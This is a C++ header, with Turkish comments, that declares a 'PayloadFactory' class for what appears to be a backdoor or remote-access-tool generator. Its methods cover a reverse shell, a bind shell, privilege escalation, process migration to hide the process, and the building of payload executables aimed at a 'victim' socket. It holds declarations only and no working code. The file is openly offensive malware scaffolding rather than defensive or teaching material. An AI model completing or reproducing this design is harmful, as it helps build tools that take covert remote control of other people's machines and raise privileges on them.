#ifndef __PAYLOAD_FACTORY_HPP__
#define __PAYLOAD_FACTORY_HPP__




#include "temDefines.hpp"
#include "csock.hpp"

#include <vector>

/*
    -BURASI CLIENT DOSYALARININ URETIMINI SAGLAYACAK
    -RUNTIME ESNASINDA YADA ARGUMAN YOLUYLA
*/

class PayloadFactory{
private:
    TEM_TARGET_OS targetSystem;
    CSOCK_INIT init_ipv4v6;
    CSOCK_INIT init_tcp_udp;
    std::string rsIP;
    uint rsPortNo;
    csock *victim;

    
    //PAYLOAD_FACTORY_BACKDOOR_GENERATE
    bool temReverseShell();                                       //reverse shell baslatir

    bool temBindShell();                                          //bind shell portuna baglanir
    

    //PAYLOAD_FACTORY_OTHERS
    bool temPrivilegeEscalation();                  //yetki yukseltme
    bool temMigrateProcess();                       //processi saklama
    bool temStartProcessWithSocket(const char *programName);

    
public:
    PayloadFactory(TEM_TARGET_OS targetSystem);             //tcp_ipv4 olarak otomatik baslatma
    PayloadFactory(TEM_TARGET_OS targetSystem,CSOCK_INIT init_ipv4v6,CSOCK_INIT init_tcp_udp,const std::string rsIP , uint rsPortNo);
     ~PayloadFactory();

    void setIP_Port(const std::string &rsIP,uint rsPort);   //port manuel yapilandirma

    //createPayloadRuntime{reverse_shell,{"127.0.0.1",1337}}
    bool createPayloadRuntime(const std::string payload_name, std::vector<std::string> &args); //YURUTULEBILIR DOSYALAR FONKSIYONLAR
    bool createPayloadExecutable(std::string &payload_name , std::vector<std::string> &args,std::string &outputPath);


};


#endif